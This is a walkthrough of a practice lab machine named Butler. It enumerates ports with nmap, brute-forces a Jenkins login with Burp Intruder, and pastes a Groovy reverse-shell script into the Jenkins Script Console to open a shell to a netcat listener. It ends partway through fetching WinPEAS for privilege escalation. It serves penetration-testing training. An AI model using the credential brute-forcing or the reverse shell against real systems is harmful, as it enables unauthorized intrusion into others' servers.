# Butler Walkthrough

## Enumeration
First things first, create a directory called "butler" and `cd` into it:
```bash
mkdir butler && cd butler
```

Now start up both of the machines and get the IP Address for Butler by opening up `cmd` and typing `ipconfig` . It will be on the right side that says `IPv4`. Copy that and back on our attack machine do:
```bash
export IP=<IP-Address>
```
Start our `nmap` scan:
```bash
nmap -T4 -p- -A $IP -oA $IP-butler-scan
```

We see from our `nmap` scan that the ports 7680 and 8080 are open so let's check them out. 
![[nmap scan butler.png]]

Trying to connect to `telnet <IP-Address> 7680` will be "Trying" but to no avail. `netcat` will also result in the same issue. Also going to the browser on http://IP-Address:7680 will not work either because it is not a web address. We get to a Jenkins login screen on port 8080 and if we search online for default login credentials for Jenkins, we get `admin:password` as one of them. However, trying this out results in "Invalid username or password".
![[Jenkins default login invalid.png]]

So open up Burp Suite and set Foxy Proxy to intercept the request.
After submitting, you should get:
![[Burp Suite intercept.png]]

Right click and "Send to Repeater" and also do it for "Send to Intruder" (Ctrl-R, Ctrl-I for short). In Repeater, if we press the "Send" button, we get a "302 Found" and then if you press on the "Follow redirection" button, we get "401 Unauthorized".
![[Pasted image 20220304152444.png]]

We can brute force this with Repeater, but it is inefficient so jump to the Intruder tab.

Now go into the Positions tab and hit the "Clear §" button. The "§" should all be gone now in this POST request. Double click on the field where it says "admin" and hit the "Add §" button. Do the same for the password value. It should look like this:
![[Intruder on username and password.png]]

Make sure that the "Attack type" is set to "Cluster bomb":
![[Setting Attack type to Cluster bomb.png]]

Go to the "Payloads" tab and for the first Payload set (1) add these values for the username field: admin, administrator, jenkins:
![[Payload set 1.png]]

In the second payload set (2) add these values: password, jenkins, Password, Jenkins, Password1
![[Payload set 2.png]]

Now, you can start attack by pressing on the "Start attack" button:
![[creds are jenkins jenkins.png]]

Go to the Proxy tab and make sure "Intercept is off". The credentials `jenkins:jenkins` should log us in.

Now that we are logged in, you should see something similar to this page:
![[Pasted image 20220817115847.png]]

On the left hand side, there is a **Manage Jenkins** link so click on that link and it should take you to a new page.
![[Pasted image 20220817115943.png]]

Scroll to the bottom (don't pay attention to anything else) and click on the **Script Console** link.
![[Pasted image 20220817120151.png]]

It will bring you to another page where we will upload our reverse shell Groovy script. Search on Google for **jenkins exploit** and you should find a GitHub link (it should be the second link): https://github.com/gquere/pwn_jenkins
Browse to it and scroll down until you find [Reverse shell from Groovy](https://github.com/gquere/pwn_jenkins#reverse-shell-from-groovy)
Copy the script:
```bash
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

You'll need to modify the host string by using your local IP address, in this case I use my Kali VM IP address. You can find it in your terminal by typing:
```bash
ip a
```
 and looking at the `inet` section. The IP should be there. You can leave the port number unchanged.

After you have entered your IP address, go back to the script console and paste your modified reverse shell. In this case, mine look like this:
![[Pasted image 20220817121117.png]]

Before clicking on **Run**, open a new terminal tab and start up a `netcat` listener:
```bash
nc -lvnp 1234
```
![[Pasted image 20220817121304.png]]

Once that is done, go back to **Script Console**, making sure everything is correct, and click on **Run**. You should now see that the page is hanging and that is a good sign.
Go back to the `netcat` listener tab, and you should see that it has connected to the Windows machine.
![[Pasted image 20220817125215.png]]

You can try `whoami` and `hostname` to confirm that you are user `butler`. 
What we can do now is to download a Windows privilege escalaction program called **WinPEAS** from [GitHub](https://github.com/carlospolop/PEASS-ng). 
Go to the [releases](https://github.com/carlospolop/PEASS-ng/releases/tag/20220814) page and download the `winPEASx64.exe` version. Move that file from your downloads folder to a folder called `transfer` for example to make things easier. Change directory into `transfer` and list out it's contents to make sure `winPEASx64.exe` is there
